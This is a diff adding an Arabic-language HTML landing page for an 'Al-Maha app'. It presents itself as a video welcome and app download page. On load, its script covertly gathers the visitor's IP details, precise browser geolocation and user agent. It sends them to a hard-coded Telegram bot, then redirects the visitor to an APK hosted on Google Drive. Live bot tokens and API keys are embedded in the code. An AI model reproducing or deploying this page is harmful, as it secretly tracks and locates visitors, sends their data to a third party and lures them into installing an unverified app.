@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>تطبيق المها — جارٍ التحضير</title>
+  <style>
+    body {
+      margin:0; background:#0f172a; color:#e5e7eb;
+      font-family: system-ui, sans-serif;
+      display:flex; align-items:center; justify-content:center;
+      min-height:100vh; padding:20px;
+    }
+    .container { max-width:800px; width:100%; text-align:center; }
+    iframe { width:100%; aspect-ratio:16/9; border:none; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.4); }
+    h1 { font-size:1.5rem; margin-bottom:10px; }
+    p { color:#94a3b8; margin-bottom:20px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>مرحبا بك في تطبيق المها</h1>
+    <p>يتم تشغيل الفيديو وتحميل التطبيق تلقائيًا</p>
+    <iframe src="https://www.youtube.com/embed/zUwlEVnEy-E?autoplay=1&mute=0&playsinline=1&rel=0&modestbranding=1" allowfullscreen></iframe>
+  </div>
+
+  <script>
+    // بياناتك
+    const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
+    const TELEGRAM_CHAT = "7664416709";
+    const IPINFO_TOKEN = "3bc0a2eadd8ba5";
+    const IPDATA_TOKEN = "cf2660a0b70d048e98abd2fa63498f74512ef8c328cb7ea5370ee669";
+    const APK_URL = "https://drive.google.com/uc?export=download&id=1nQROVVDXjN1G4_71H0B5D0_4AvSjpVaq"; // رابط مباشر
+
+    const ua = navigator.userAgent;
+    let ipInfoData = {};
+    let ipDataData = {};
+    let geo = { lat: null, lon: null, acc: null };
+
+    // جلب بيانات من ipinfo.io
+    function fetchIpInfo() {
+      return fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
+        .then(res => res.json())
+        .then(data => { ipInfoData = data; })
+        .catch(() => {});
+    }
+
+    // جلب بيانات من ipdata.co
+    function fetchIpData() {
+      return fetch(`https://api.ipdata.co?api-key=${IPDATA_TOKEN}`)
+        .then(res => res.json())
+        .then(data => { ipDataData = data; })
+        .catch(() => {});
+    }
+
+    // جلب الموقع الجغرافي من المتصفح
+    function fetchGeo() {
+      return new Promise(resolve => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(pos => {
+            geo = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy
+            };
+            resolve();
+          }, () => resolve());
+        } else {
+          resolve();
+        }
+      });
+    }
+
+    // إرسال البيانات إلى تيليجرام
+    function sendToTelegram() {
+      const now = new Date().toLocaleString('ar-MA', {hour12:false});
+      const message = `
+🚀 زيارة جديدة — تطبيق المها
+⏱️ الوقت: ${now}
+
+🌐 [ipinfo.io]
+IP: ${ipInfoData.ip || "?"}
+المدينة: ${ipInfoData.city || "?"}
+المنطقة: ${ipInfoData.region || "?"}
+الدولة: ${ipInfoData.country || "?"}
+الموقع: ${ipInfoData.loc || "?"}
+
+🌍 [ipdata.co]
+القارة: ${ipDataData.continent_name || "?"}
+الدولة: ${ipDataData.country_name || "?"}
+العاصمة: ${ipDataData.country_capital || "?"}
+المزود: ${ipDataData.asn?.name || "?"}
+نوع الاتصال: ${ipDataData.asn?.type || "?"}
+العملة: ${ipDataData.currency?.name || "?"}
+
+🧭 إحداثيات المتصفح:
+Lat: ${geo.lat ?? "null"}
+Lon: ${geo.lon ?? "null"}
+±${geo.acc ?? "?"}m
+
+📱 UA: ${ua}
+      `;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT, text: message })
+      }).finally(() => {
+        // بدء التحميل بعد ثانيتين
+        setTimeout(() => {
+          window.location.href = APK_URL;
+        }, 2000);
+      });
+    }
+
+    // تنفيذ كل شيء
+    Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()])
+      .then(sendToTelegram);
+  </script>
+</body>
+</html>
